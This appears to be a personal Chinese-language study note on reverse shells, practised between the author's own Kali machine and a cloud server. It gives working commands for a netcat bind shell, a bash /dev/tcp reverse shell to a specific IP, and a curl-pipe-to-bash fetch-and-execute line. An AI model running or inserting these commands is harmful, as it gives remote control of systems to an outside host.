## 反弹shell学习

> 之前了解过但是没有具体实践过，这里完成复现任务的时候，决定搞一下，记录一下
>
> 学m习采用一个本地wsl-kail 和 一台阿里云服务器，用的xshell

服务器安装netcat-由于阿里云服务器是centos

```bash
yum install nmap-ncat

#打开防火墙端口
firewall-cmd --zone=public --add-port=5432/tcp --permanent
firewall-cmd --reload
```



**nc命令开启本地监听端口**

```
nc -n -lvvp 5432 -t -e /bin/bash
```

这个命令会创建一个监听端口 5432 的 TCP 连接，当有别的机子连接到这个端口时，Netcat 会执行 `/bin/bash` 命令，提供一个 shell 环境给客户端。

![image-20240915135332508](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20240915135332508.png)

![image-20240915135433234](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20240915135433234.png)

![image-20240915135451415](C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20240915135451415.png)



### Bash反弹shell

攻击机开启监听

```
nc -lvvp 5432
```

目标机连接攻击机

```bash
bash -i >& /dev/tcp/8.134.206.105/5432 0>&1
```

| 命令                        | 命令详解                                                     |
| --------------------------- | ------------------------------------------------------------ |
| bash -i                     | 产生一个bash交互环境。                                       |
| >&                          | 将联合符号前面的内容与后面相结合，然后一起重定向给后者。     |
| /dev/tcp/8.134.206.105/2333 | Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。 |
| 0>&1                        | 将标准输入与标准输出的内容相结合，                           |

![image-20240915140239404](https://gitee.com/bx33661/image/raw/master/path/image-20240915140239404.png)

![image-20240915140221988](https://gitee.com/bx33661/image/raw/master/path/image-20240915140221988.png)



### 利用curl配合bash反弹

由于一直失败，检查了一遍问题发现，应该是阿里云安全组没有设置好

![image-20240915214250717](https://gitee.com/bx33661/image/raw/master/path/image-20240915214250717.png)

```bash
curl 8.134.206.105:5432|bash
```

![image-20240915215528282](https://gitee.com/bx33661/image/raw/master/path/image-20240915215528282.png)
